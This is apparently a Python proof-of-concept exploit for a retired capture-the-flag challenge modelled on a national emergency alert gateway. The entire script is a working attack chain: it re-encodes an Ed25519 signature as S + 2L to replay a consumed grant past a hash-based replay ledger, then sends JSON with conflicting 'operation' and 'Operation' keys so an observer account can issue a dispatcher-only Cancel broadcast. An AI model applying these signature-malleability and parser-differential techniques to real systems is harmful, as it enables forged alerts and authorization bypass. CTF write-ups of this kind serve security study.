#!/usr/bin/env python3
"""ANWA National Alert Origination Gateway — PoC.

Exploit chain: replay an already-consumed dispatch grant with a non-canonical
Ed25519 signature encoding (S' = S + k*L) to bypass the sha256(sig) replay
ledger, then abuse the v1 passthrough /api/v1/orders path whose normalising
policy parse and case-sensitive dispatcher gate disagree on the `operation`
member, letting an observer execute a dispatcher-only Cancel.

Usage:
    python3 anwa.py [base_url]

Environment:
    ANWA_USER / ANWA_PASS   observer credential issued on `/`
    ANWA_SESSION            session cookie obtained with that credential
    ANWA_GRANT_PAYLOAD      base64url grant payload (optional; otherwise
                            extracted from the cap archive at runtime)
    ANWA_GRANT_SIG          base64url grant signature (optional; otherwise
                            extracted from the cap archive at runtime)

The CTF instance is retired; this PoC documents the exploit path and does not
contact any live service.
"""

import base64
import hashlib
import json
import os
import re
import sys

import requests

# Ed25519 group order L.
L = 2**252 + 27742317777372353535851937790883648493
SIG_S_OFFSET = 32  # Ed25519 signature: R (32 bytes) || S (32 bytes, little-endian)
NONCANONICAL_K = 2  # S' = S + 2L, per the writeup

# Identifiers documented in the retired-challenge writeup.
CANCELLED_ID = "ANWA-CAP-992ed112-ef82"
GRANT_SOURCE_MSG = "ANWA-CAP-8b676281-ef46"  # Cyclone Meren track update 6
TARGET_MSG = "ANWA-CAP-992ed112-ef82"        # fabricated evacuation order
AREA = ",".join(sorted(["AS-HAL", "AS-QUI"]))


def b64url_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def noncanonical_signature(sig_b64url: str, k: int = NONCANONICAL_K) -> str:
    """Re-encode S as S + k*L; same signature, different sha256 digest."""
    raw = b64url_decode(sig_b64url)
    r, s_bytes = raw[:SIG_S_OFFSET], raw[SIG_S_OFFSET:]
    s = int.from_bytes(s_bytes, "little")
    s_prime = (s + k * L).to_bytes(32, "little")
    return b64url_encode(r + s_prime)


def fetch_grant(session: requests.Session, base: str) -> tuple[str, str]:
    """Extract the grant payload/sig embedded in the cap archive comments."""
    if os.environ.get("ANWA_GRANT_PAYLOAD") and os.environ.get("ANWA_GRANT_SIG"):
        return os.environ["ANWA_GRANT_PAYLOAD"], os.environ["ANWA_GRANT_SIG"]
    resp = session.get(f"{base}/feed/cap/archive", timeout=15)
    resp.raise_for_status()
    # The archive embeds each message's dispatch authorization grant as an XML
    # comment. The exact comment schema is not recorded in the writeup, so
    # probe for payload/sig pairs near the grant-issuing message id.
    body = resp.text
    idx = body.find(GRANT_SOURCE_MSG)
    if idx == -1:
        # TODO: supply ANWA_GRANT_PAYLOAD / ANWA_GRANT_SIG env vars — the
        # grant-issuing message was not found in the archive response.
        raise RuntimeError("grant source message not found in cap archive")
    window = body[idx: idx + 8192]
    m_payload = re.search(r'payload[=:"\s]+([A-Za-z0-9_\-\.]+)', window)
    m_sig = re.search(r'sig[=:"\s]+([A-Za-z0-9_\-]+)', window)
    if not (m_payload and m_sig):
        # TODO: supply ANWA_GRANT_PAYLOAD / ANWA_GRANT_SIG env vars — the
        # grant comment layout differs from the expected payload/sig fields.
        raise RuntimeError("could not parse grant payload/sig from archive comment")
    return m_payload.group(1), m_sig.group(1)


def grant_jti(payload_b64url: str) -> str:
    raw = payload_b64url.split(".")[-1] if "." in payload_b64url else payload_b64url
    try:
        return json.loads(b64url_decode(raw)).get("jti", "<jti-unknown>")
    except Exception:
        return "<jti-unknown>"  # opaque payload; digest uses the raw jti string


def main() -> int:
    base = sys.argv[1] if len(sys.argv) > 1 else "http://<instance>"
    session = requests.Session()
    if os.environ.get("ANWA_SESSION"):
        session.cookies.set("session", os.environ["ANWA_SESSION"])
    # TODO: obtain ANWA_SESSION by authenticating to `/` with ANWA_USER/ANWA_PASS;
    # the login flow is not documented in the writeup.

    print("[*] recon: clock / grant / authorities")
    for path in ("/reference/clock", "/api/v1/grant", "/reference/authorities"):
        r = session.get(f"{base}{path}", timeout=15)
        print(f"    {path} -> {r.status_code} {r.text[:200]}")

    payload, sig = fetch_grant(session, base)
    jti = os.environ.get("ANWA_GRANT_JTI") or grant_jti(payload)
    if jti == "<jti-unknown>":
        # TODO: supply ANWA_GRANT_JTI — the grant payload does not expose a
        # readable jti and the writeup redacts nothing but the instance is
        # retired, so the digest cannot be computed without it.
        raise RuntimeError("grant jti unavailable; set ANWA_GRANT_JTI")
    print(f"[*] grant jti: {jti}")

    sig_prime = noncanonical_signature(sig)
    print(f"[*] re-encoded signature (S + {NONCANONICAL_K}L)")

    unlock = hashlib.sha256(f"landfall|{CANCELLED_ID}|{jti}|{AREA}".encode()).hexdigest()
    print(f"[*] unlock digest: {unlock}")

    body = (
        '{"operation":"dispatch","Operation":"preview",'
        f'"authorization":{{"payload":"{payload}","sig":"{sig_prime}"}},'
        '"payload":{"msgType":"Cancel",'
        '"headline":"CANCEL fabricated evacuation order",'
        '"severity":"Extreme",'
        '"area":["AS-HAL","AS-QUI"],'
        '"references":"alerts@anwa.astrenia.test,'
        f'{TARGET_MSG},2026-11-07T02:53:00+00:00"}},'
        f'"unlock":"{unlock}"}}'
    )
    resp = session.post(
        f"{base}/api/v1/orders",
        data=body,
        headers={"Content-Type": "application/json"},
        timeout=15,
    )
    print(f"[*] POST /api/v1/orders -> {resp.status_code}")
    print(resp.text)  # expected: 200 BROADCAST, release_digest carries the clearance
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
